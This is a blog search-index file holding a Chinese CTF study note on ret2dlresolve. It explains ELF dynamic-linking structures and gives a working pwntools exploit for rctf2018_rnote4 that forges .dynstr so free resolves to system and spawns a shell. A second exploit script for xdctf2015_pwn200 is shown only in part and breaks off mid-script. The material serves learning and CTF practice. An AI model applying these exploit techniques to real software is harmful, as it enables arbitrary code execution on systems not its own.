<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>re2dlresolve</title>
    <link href="/2023/12/10/ret2dlresolve/"/>
    <url>/2023/12/10/ret2dlresolve/</url>
    
    <content type="html"><![CDATA[<h3 id="1原理"><a href="#1原理" class="headerlink" title="1原理"></a>1原理</h3><blockquote><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/</a> wiki</p><p><a href="https://blog.csdn.net/qq_51868336/article/details/114644569">https://blog.csdn.net/qq_51868336/article/details/114644569</a> 这个放了源码 还有x64PartialRELRO的</p><p><a href="https://zhuanlan.zhihu.com/p/37572651">https://zhuanlan.zhihu.com/p/37572651</a> 这个更好理解一些 </p><p><a href="https://blog.csdn.net/Morphy_Amo/article/details/124121269">https://blog.csdn.net/Morphy_Amo/article/details/124121269</a></p></blockquote><p>Partial RELRO的需要伪造 reloc_arg ，r_info , st_name , str<br>NO RELRO的利用</p><ul><li><p>算了 还是自己记录下吧 虽然佬们讲得都很好 但是还是梳理一下更清楚</p></li><li><p>最基本的需要知道延迟绑定技术<br>然后ret2dlresolve主要关注的就是第一次调用时的解析真实地址的过程<br><img src="C:\Users\张梓烨\AppData\Roaming\Typora\typora-user-images\image-20231207203330003.png" alt="image-20231207203330003"></p><p>大概是这样一个过程</p><ul><li>step3那 push 0是该函数在rel.plt上的偏移,reloc_arg；然后jmp到plt[0]的位置</li><li>step3 step4相当于执行了<code>_dl_runtime_resolve(link_map,reloc_arg)</code></li></ul></li><li><p>elf中的.dynamic节：包含一些关于动态链接的关键信息，这里需要用到的就三个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs asm">LOAD:08049F0C                               ; ELF Dynamic Information<br>LOAD:08049F0C                               ; ===========================================================================<br>LOAD:08049F0C<br>LOAD:08049F0C                               ; Segment type: Pure data<br>LOAD:08049F0C                               ; Segment permissions: Read/Write<br>LOAD:08049F0C                               LOAD segment mempage public &#x27;DATA&#x27; use32<br>LOAD:08049F0C                               assume cs:LOAD<br>LOAD:08049F0C                               ;org 8049F0Ch<br>LOAD:08049F0C 01 00 00 00 01 00 00 00       _DYNAMIC Elf32_Dyn &lt;1, &lt;1&gt;&gt;             ; DATA XREF: LOAD:080480BC↑o<br>LOAD:08049F0C                                                                       ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o<br>LOAD:08049F0C                                                                       ; DT_NEEDED libc.so.6<br>LOAD:08049F14 0C 00 00 00 4C 83 04 08       Elf32_Dyn &lt;0Ch, &lt;804834Ch&gt;&gt;             ; DT_INIT<br>LOAD:08049F1C 0D 00 00 00 34 86 04 08       Elf32_Dyn &lt;0Dh, &lt;8048634h&gt;&gt;             ; DT_FINI<br>LOAD:08049F24 19 00 00 00 04 9F 04 08       Elf32_Dyn &lt;19h, &lt;8049F04h&gt;&gt;             ; DT_INIT_ARRAY<br>LOAD:08049F2C 1B 00 00 00 04 00 00 00       Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;                    ; DT_INIT_ARRAYSZ<br>LOAD:08049F34 1A 00 00 00 08 9F 04 08       Elf32_Dyn &lt;1Ah, &lt;8049F08h&gt;&gt;             ; DT_FINI_ARRAY<br>LOAD:08049F3C 1C 00 00 00 04 00 00 00       Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;                    ; DT_FINI_ARRAYSZ<br>LOAD:08049F44 F5 FE FF 6F AC 81 04 08       Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt;       ; DT_GNU_HASH<br># 指向.dynstr节的指针<br>LOAD:08049F4C 05 00 00 00 6C 82 04 08       Elf32_Dyn &lt;5, &lt;804826Ch&gt;&gt;               ; DT_STRTAB <br># 指向.dynsym节的指针<br>LOAD:08049F54 06 00 00 00 CC 81 04 08       Elf32_Dyn &lt;6, &lt;80481CCh&gt;&gt;               ; DT_SYMTAB<br>LOAD:08049F5C 0A 00 00 00 6B 00 00 00       Elf32_Dyn &lt;0Ah, &lt;6Bh&gt;&gt;                  ; DT_STRSZ<br>LOAD:08049F64 0B 00 00 00 10 00 00 00       Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;                  ; DT_SYMENT<br>LOAD:08049F6C 15 00 00 00 00 00 00 00       Elf32_Dyn &lt;15h, &lt;0&gt;&gt;                    ; DT_DEBUG<br>LOAD:08049F74 03 00 00 00 00 A0 04 08       Elf32_Dyn &lt;3, &lt;804A000h&gt;&gt;               ; DT_PLTGOT<br>LOAD:08049F7C 02 00 00 00 28 00 00 00       Elf32_Dyn &lt;2, &lt;28h&gt;&gt;                    ; DT_PLTRELSZ<br>LOAD:08049F84 14 00 00 00 11 00 00 00       Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;                  ; DT_PLTREL<br># 指向.rel.plt的指针<br>LOAD:08049F8C 17 00 00 00 24 83 04 08       Elf32_Dyn &lt;17h, &lt;8048324h&gt;&gt;             ; DT_JMPREL<br>LOAD:08049F94 11 00 00 00 0C 83 04 08       Elf32_Dyn &lt;11h, &lt;804830Ch&gt;&gt;             ; DT_REL<br>LOAD:08049F9C 12 00 00 00 18 00 00 00       Elf32_Dyn &lt;12h, &lt;18h&gt;&gt;                  ; DT_RELSZ<br>LOAD:08049FA4 13 00 00 00 08 00 00 00       Elf32_Dyn &lt;13h, &lt;8&gt;&gt;                    ; DT_RELENT<br>LOAD:08049FAC FE FF FF 6F EC 82 04 08       Elf32_Dyn &lt;6FFFFFFEh, &lt;80482ECh&gt;&gt;       ; DT_VERNEED<br>LOAD:08049FB4 FF FF FF 6F 01 00 00 00       Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt;              ; DT_VERNEEDNUM<br>LOAD:08049FBC F0 FF FF 6F D8 82 04 08       Elf32_Dyn &lt;6FFFFFF0h, &lt;80482D8h&gt;&gt;       ; DT_VERSYM<br>LOAD:08049FC4 00 00 00 00 00 00 00 00       Elf32_Dyn &lt;0&gt;                           ; DT_NULL<br></code></pre></td></tr></table></figure><ul><li><p>.dynstr节：字符串表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asm">LOAD:0804826C                               ; ELF String Table<br>LOAD:0804826C 00                            byte_804826C db 0                       ; DATA XREF: LOAD:080481DC↑o<br>LOAD:0804826C                                                                       ; LOAD:0804825C↑o<br>LOAD:0804826C                                                                       ; LOAD:080482FC↓o<br>LOAD:0804826D 6C 69 62 63 2E 73 6F 2E 36 00 aLibcSo6 db &#x27;libc.so.6&#x27;,0  &lt;--以0结尾    ; DATA XREF: LOAD:080482EC↓o<br>LOAD:08048277 5F 49 4F 5F 73 74 64 69 6E 5F+aIoStdinUsed db &#x27;_IO_stdin_used&#x27;,0      ; DATA XREF: LOAD:0804825C↑o<br>LOAD:08048286 73 74 64 69 6E 00             aStdin db &#x27;stdin&#x27;,0                     ; DATA XREF: LOAD:0804823C↑o<br>LOAD:0804828C 73 74 72 6C 65 6E 00          aStrlen db &#x27;strlen&#x27;,0                   ; DATA XREF: LOAD:0804820C↑o<br>LOAD:08048293 72 65 61 64 00                aRead db &#x27;read&#x27;,0                       ; DATA XREF: LOAD:080481EC↑o<br>LOAD:08048298 73 74 64 6F 75 74 00          aStdout db &#x27;stdout&#x27;,0                   ; DATA XREF: LOAD:0804824C↑o<br>LOAD:0804829F 73 65 74 62 75 66 00          aSetbuf db &#x27;setbuf&#x27;,0                   ; DATA XREF: LOAD:080481DC↑o<br>LOAD:080482A6 5F 5F 6C 69 62 63 5F 73 74 61+aLibcStartMain db &#x27;__libc_start_main&#x27;,0 ; DATA XREF: LOAD:0804821C↑o<br>LOAD:080482B8 77 72 69 74 65 00             aWrite db &#x27;write&#x27;,0                     ; DATA XREF: LOAD:0804822C↑o<br>LOAD:080482BE 47 4C 49 42 43 5F 32 2E 30 00 aGlibc20 db &#x27;GLIBC_2.0&#x27;,0               ; DATA XREF: LOAD:080482FC↓o<br>LOAD:080482C8 5F 5F 67 6D 6F 6E 5F 73 74 61+aGmonStart db &#x27;__gmon_start__&#x27;,0        ; DATA XREF: LOAD:080481FC↑o<br></code></pre></td></tr></table></figure></li><li><p>.dynsym节：符号表（结构体数组），里面记录了各种符号的信息 这里我把setbuf符号展开了 具体结构看下面的结构体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs asm">LOAD:080481CC                               ; ELF Symbol Table<br>LOAD:080481CC 00 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;0&gt;<br>LOAD:080481DC 33 00 00 00 00 00 00 00 00 00+dd offset aSetbuf - offset byte_804826C ; st_name ; &quot;setbuf&quot;<br>LOAD:080481DC 00 00 12 00 00 00             dd 0                                    ; st_value<br>LOAD:080481DC                               dd 0                                    ; st_size<br>LOAD:080481DC                               db 12h                                  ; st_info<br>LOAD:080481DC                               db 0                                    ; st_other<br>LOAD:080481DC                               dw 0                                    ; st_shndx<br>LOAD:080481EC 27 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;offset aRead - offset byte_804826C, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;<br>LOAD:080481FC 5C 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;offset aGmonStart - offset byte_804826C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;<br>LOAD:0804820C 20 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;offset aStrlen - offset byte_804826C, 0, 0, 12h, 0, 0&gt; ; &quot;strlen&quot;<br>LOAD:0804821C 3A 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;offset aLibcStartMain - offset byte_804826C, 0, 0, 12h, 0, 0&gt; ; &quot;__libc_start_main&quot;<br>LOAD:0804822C 4C 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;offset aWrite - offset byte_804826C, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;<br>LOAD:0804823C 1A 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;offset aStdin - offset byte_804826C, 0, 0, 11h, 0, 0&gt; ; &quot;stdin&quot;<br>LOAD:0804824C 2C 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;offset aStdout - offset byte_804826C, 0, 0, 11h, 0, 0&gt; ; &quot;stdout&quot;<br>LOAD:0804825C 0B 00 00 00 4C 86 04 08 04 00+Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804826C, offset _IO_stdin_used, 4, 11h, 0, 10h&gt; ; &quot;_IO_stdin_used&quot;<br>LOAD:0804826C                               ; ELF String Table<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Word    st_name; <span class="hljs-comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span><br>  Elf32_Addr    st_value;<br>  Elf32_Word    st_size;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_info; <span class="hljs-comment">//对于导入函数符号而言，它是0x12</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_other;<br>  Elf32_Section st_shndx;<br>&#125;Elf32_Sym; <span class="hljs-comment">//对于导入函数符号而言，其他字段都是0</span><br></code></pre></td></tr></table></figure></li><li><p>.rel.plt节：重定位表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">LOAD:08048324 0C A0 04 08 07 01 00 00       dd 804A00Ch                             ; r_offset ; R_386_JMP_SLOT setbuf<br>LOAD:08048324                               dd 107h                                 ; r_info<br>LOAD:0804832C 10 A0 04 08 07 02 00 00       Elf32_Rel &lt;804A010h, 207h&gt;              ; R_386_JMP_SLOT read<br>LOAD:08048334 14 A0 04 08 07 04 00 00       Elf32_Rel &lt;804A014h, 407h&gt;              ; R_386_JMP_SLOT strlen<br>LOAD:0804833C 18 A0 04 08 07 05 00 00       Elf32_Rel &lt;804A018h, 507h&gt;              ; R_386_JMP_SLOT __libc_start_main<br>LOAD:08048344 1C A0 04 08 07 06 00 00       Elf32_Rel &lt;804A01Ch, 607h&gt;              ; R_386_JMP_SLOT write<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Addr    r_offset; <span class="hljs-comment">//指向GOT表的指针</span><br>  Elf32_Word    r_info;<br>  <span class="hljs-comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span><br>  <span class="hljs-comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span><br>  <span class="hljs-comment">//如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span><br>&#125; Elf32_Rel;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>上面说到<code>_dl_runtime_resolve(link_map,reloc_arg)</code>的link_map包含了.dynamic的指针，通过link_map可以访问到.dynamic节；reloc_arg是当前要调用的导入函数在<code>.rel.plt</code>中的偏移（不过64位的话就直接是index下标）</p></li><li><blockquote><p><strong>dl_runtime_resolve会</strong></p><ol><li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li><li><code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li><li><code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li><li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li><li>调用这个函数</li></ol></blockquote></li></ul><h3 id="2-利用原因"><a href="#2-利用原因" class="headerlink" title="2 利用原因"></a>2 利用原因</h3><ul><li>没有输出函数的时候就没法泄露地址 这个时候就可用dl_resolve</li></ul><h3 id="3-利用方法"><a href="#3-利用方法" class="headerlink" title="3 利用方法"></a>3 利用方法</h3><h4 id="3-1NORELRO：dynaic节可修改"><a href="#3-1NORELRO：dynaic节可修改" class="headerlink" title="3.1NORELRO：dynaic节可修改"></a>3.1NORELRO：dynaic节可修改</h4><blockquote><p>因为<code>ret2dl-resolve</code>会从<code>.dynamic</code>里面拿<code>.dynstr</code>字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够篡改这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。</p></blockquote><p>也就是伪造Elf32_Rel和Elf32_Sym就可</p><h5 id="64位NORELRO-堆-–rctf2018-rnote4"><a href="#64位NORELRO-堆-–rctf2018-rnote4" class="headerlink" title="64位NORELRO 堆 –rctf2018_rnote4"></a>64位NORELRO 堆 –rctf2018_rnote4</h5><ul><li><p>没有任何输出函数 运行有点难受的 正因为没有输出 用dl_resolve将free改成system</p></li><li><pre><code class="python">#coding:utf8from pwn import * # sh = process(&#39;./RNote4&#39;)sh = remote(&quot;node4.buuoj.cn&quot;, 29228)elf = ELF(&#39;./RNote4&#39;)free_got = elf.got[&#39;free&#39;]free_plt = 0x0000000000400626#在NO relro的情况下伪造dynstr即可解析任意函数fake_dynstr_addr = 0x00000000006020D0 + 0x100fake_dynstr = &#39;\x00&#39;*0x5F + &#39;system\x00&#39;# 0x5F=0x457-0x3f8 free改为systemfake_dynstr = fake_dynstr.ljust(0x73,&#39;\x00&#39;)# 0x73=0x46b-0x3f8fake_dynstr += &#39;GLIBC_2.4\x00GLIBC_2.2.5\x00&#39;# 也可以不写 反正一样dt_strtab = 0x0000000000601EB0 def add(size,content):   sh.send(p8(1))   sh.send(p8(size))   sh.send(content) def edit(index,size,content):   sh.send(p8(2))   sh.send(p8(index))   sh.send(p8(size))   sh.send(content) def delete(index):   sh.send(p8(3))   sh.send(p8(index)) add(0x20,&#39;a&#39;*0x20) #0add(0x80,&#39;b&#39;*0x80) #1add(0x20,&#39;/bin/sh\x00/bin/sh\x00&#39;.ljust(0x20,&#39;\x00&#39;)) #2 payload = b&#39;a&#39;*0x20 + p64(0) + p64(0x21) + p64(0x80) + p64(fake_dynstr_addr)edit(0,0x40,payload)#伪造dynstredit(1,len(fake_dynstr),fake_dynstr)payload = b&#39;a&#39;*0x20 + p64(0) + p64(0x21) + p64(0x80) + p64(dt_strtab)edit(0,0x40,payload)#修改dynstr指针 即.dynamic的字符串表指针edit(1,0x8,p64(fake_dynstr_addr))# 这里应该是将free_got中存的改成plt表 也就是不只是第一次调用 每次调用都会触发解析 dlresolve都会执行# 这个exp中因为是第一次调用 所以不写这些也能成功getshellpayload = b&#39;a&#39;*0x20 + p64(0) + p64(0x21) + p64(0x80) + p64(free_got)edit(0,0x40,payload)#修改dynstr指针edit(1,0x8,p64(free_plt))#getshelldelete(2) sh.interactive()<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tap"><br>```asm<br>LOAD:00000000004003F8                               ; ELF String Table<br>LOAD:00000000004003F8<span class="hljs-number"> 00 </span>                           byte_4003F8 db<span class="hljs-number"> 0 </span>                       ; DATA XREF: LOAD:00000000004002D8↑o<br>LOAD:00000000004003F8                                                                       ; LOAD:00000000004004A0↓o<br>LOAD:00000000004003F8                                                                       ; <br>LOAD:00000000004003F9 6C<span class="hljs-number"> 69 </span>62<span class="hljs-number"> 63 </span>2E<span class="hljs-number"> 73 </span>6F 2E<span class="hljs-number"> 36 </span>00 aLibcSo6 db &#x27;libc.so.6&#x27;,0               ; DATA XREF: LOAD:00000000004004A0↓o<br>LOAD:0000000000400403<span class="hljs-number"> 65 </span>78<span class="hljs-number"> 69 </span>74<span class="hljs-number"> 00 </span>               aExit db &#x27;exit&#x27;,0                       ; DATA XREF: LOAD:00000000004003C8↑o<br>LOAD:0000000000400408 5F 5F<span class="hljs-number"> 73 </span>74<span class="hljs-number"> 61 </span>63 6B 5F<span class="hljs-number"> 63 </span>68+aStackChkFail db &#x27;__stack_chk_fail&#x27;,0   ; DATA XREF: LOAD:00000000004002F0↑o<br>LOAD:0000000000400419<span class="hljs-number"> 73 </span>74<span class="hljs-number"> 64 </span>69 6E<span class="hljs-number"> 00 </span>            aStdin db &#x27;stdin&#x27;,0                     ; DATA XREF: LOAD:00000000004003E0↑o<br>LOAD:000000000040041F<span class="hljs-number"> 63 </span>61 6C 6C 6F<span class="hljs-number"> 63 </span>00          aCalloc db &#x27;calloc&#x27;,0                   ; DATA XREF: LOAD:0000000000400368↑o<br>LOAD:0000000000400426 6D<span class="hljs-number"> 65 </span>6D<span class="hljs-number"> 73 </span>65<span class="hljs-number"> 74 </span>00          aMemset db &#x27;memset&#x27;,0                   ; DATA XREF: LOAD:0000000000400308↑o<br>LOAD:000000000040042D<span class="hljs-number"> 72 </span>65<span class="hljs-number"> 61 </span>64<span class="hljs-number"> 00 </span>               aRead db &#x27;read&#x27;,0                       ; DATA XREF: LOAD:0000000000400338↑o<br>LOAD:0000000000400432<span class="hljs-number"> 61 </span>6C<span class="hljs-number"> 61 </span>72 6D<span class="hljs-number"> 00 </span>            aAlarm db &#x27;alarm&#x27;,0                     ; DATA XREF: LOAD:0000000000400320↑o<br>LOAD:0000000000400438<span class="hljs-number"> 61 </span>74 6F<span class="hljs-number"> 69 </span>00                aAtoi db &#x27;atoi&#x27;,0                       ; DATA XREF: LOAD:00000000004003B0↑o<br>LOAD:000000000040043D<span class="hljs-number"> 73 </span>65<span class="hljs-number"> 74 </span>76<span class="hljs-number"> 62 </span>75<span class="hljs-number"> 66 </span>00       aSetvbuf db &#x27;setvbuf&#x27;,0                 ; DATA XREF: LOAD:0000000000400398↑o<br>LOAD:0000000000400445 5F 5F 6C<span class="hljs-number"> 69 </span>62<span class="hljs-number"> 63 </span>5F<span class="hljs-number"> 73 </span>74 61+aLibcStartMain db &#x27;__libc_start_main&#x27;,0 ; DATA XREF: LOAD:0000000000400350↑o<br>LOAD:0000000000400457<span class="hljs-number"> 66 </span>72<span class="hljs-number"> 65 </span>65<span class="hljs-number"> 00 </span>               aFree db &#x27;free&#x27;,0                       ; DATA XREF: LOAD:00000000004002D8↑o<br>LOAD:000000000040045C 5F 5F<span class="hljs-number"> 67 </span>6D 6F 6E 5F<span class="hljs-number"> 73 </span>74 61+aGmonStart db &#x27;__gmon_start__&#x27;,0        ; DATA XREF: LOAD:0000000000400380↑o<br>LOAD:000000000040046B<span class="hljs-number"> 47 </span>4C<span class="hljs-number"> 49 </span>42<span class="hljs-number"> 43 </span>5F<span class="hljs-number"> 32 </span>2E<span class="hljs-number"> 34 </span>00 aGlibc24 db &#x27;GLIBC_2.4&#x27;,0               ; DATA XREF: LOAD:00000000004004B0↓o<br>LOAD:0000000000400475<span class="hljs-number"> 47 </span>4C<span class="hljs-number"> 49 </span>42<span class="hljs-number"> 43 </span>5F<span class="hljs-number"> 32 </span>2E<span class="hljs-number"> 32 </span>2E+aGlibc225 db &#x27;GLIBC_2.2.5&#x27;,0            ; DATA XREF: LOAD:00000000004004C0↓o<br>LOAD:0000000000400481<span class="hljs-number"> 00 </span>                           align 2<br></code></pre></td></tr></table></figure>* 但是打本地不出flag 换成Ubuntu18.04的就可以啦 好好好 又是libc版本的问题   但我看了换的版本是对的啊  mad 没换版本就能通  嗷是在本地找不到对应2.27的libc是吗可能</code></pre></li><li><p>相当于是只修改了第4步的.dynstr 其他都是free函数的</p><blockquote><ol><li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li><li><code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li><li><code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li><li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li><li>调用这个函数</li></ol></blockquote></li><li><p>然后还有个注意的点是输入op size的时候都是1字节 所以发的形式</p></li></ul><h4 id="3-2-构造link-map"><a href="#3-2-构造link-map" class="headerlink" title="3.2 构造link_map"></a>3.2 构造link_map</h4><blockquote><p><code>_dl_runtime_resolve</code>在第二步时<code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></p><p>这个时候，<code>_dl_runtime_resolve</code>并没有检查<code>.rel.plt + 第二个参数</code>后是否造成越界访问，所以我们能给一个很大的<code>.rel.plt</code>的offset（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说<code>.bss</code>。</p><p>然后第三步<code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></p><p>所以在我们所伪造的<code>Elf32_Rel</code>，需要放一个<code>r_info</code>字段，大概长这样就行<code>0xXXXXXX07</code>，其中XXXXXX是相对<code>.dynsym</code>表的下标，注意不是偏移，所以是偏移除以<code>Elf32_Sym</code>的大小，即除以<code>0x10</code>（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个<code>Elf32_Sym</code>。至于为什么是07，因为这是一个导入函数，而导入函数一般都是07，所以写成07就好。</p><p>然后第四步<code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针 同样类似，没有进行越界访问检查，所以这个字符串也能够伪造。</p><p>构造ROP，跳转到resolve的PLT，<code>push link_map</code>的位置，就是上图所示的这个地方。此时，栈中必须要有已经伪造好的指向伪造的<code>Elf32_Rel</code>的偏移，然后是返回地址（<code>system</code>的话无所谓），再然后是参数（如果是<code>system</code>函数的话就要是指向<code>&quot;/bin/sh\x00&quot;</code>的指针）</p></blockquote><h6 id="32位PartialRELRO–xdctf2015-pwn200"><a href="#32位PartialRELRO–xdctf2015-pwn200" class="headerlink" title="32位PartialRELRO–xdctf2015_pwn200"></a>32位PartialRELRO–xdctf2015_pwn200</h6><ul><li><p>这题也可以用ret2libc</p></li><li><p>发现师傅们用的pwntools的rop模块 也支持x64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;bof&#x27;</span>)<br>sh = process(<span class="hljs-string">&#x27;./bof&#x27;</span>)<br>rop = ROP(<span class="hljs-string">&#x27;./bof&#x27;</span>)<br><br>offset = <span class="hljs-number">112</span><br>bss_addr = elf.bss() <span class="hljs-comment">#获取bss段首地址</span><br><br>sh.recvuntil(<span class="hljs-string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)<br><br><span class="hljs-comment">## 将栈迁移到bss段</span><br><span class="hljs-comment">## 新栈空间大小为0x800</span><br>stack_size = <span class="hljs-number">0x800</span><br>base_stage = bss_addr + stack_size <br><span class="hljs-comment">### 